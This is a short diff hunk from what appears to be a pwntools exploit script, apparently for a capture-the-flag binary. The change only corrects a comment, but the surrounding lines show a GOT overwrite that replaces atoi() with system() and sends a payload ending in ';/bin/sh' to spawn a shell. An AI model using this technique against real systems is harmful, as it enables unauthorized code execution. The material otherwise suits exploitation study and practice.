@@ -77,7 +77,7 @@ s.recv()
 s.sendline("28")
 s.recv()
 
-# override got atoi() with system() and execute with payload6 argument
+# override got atoi() with system() and execute with payload7 argument
 payload7 = p32(sys_addr) + ";/bin/sh"
 s.sendline(payload7)
 
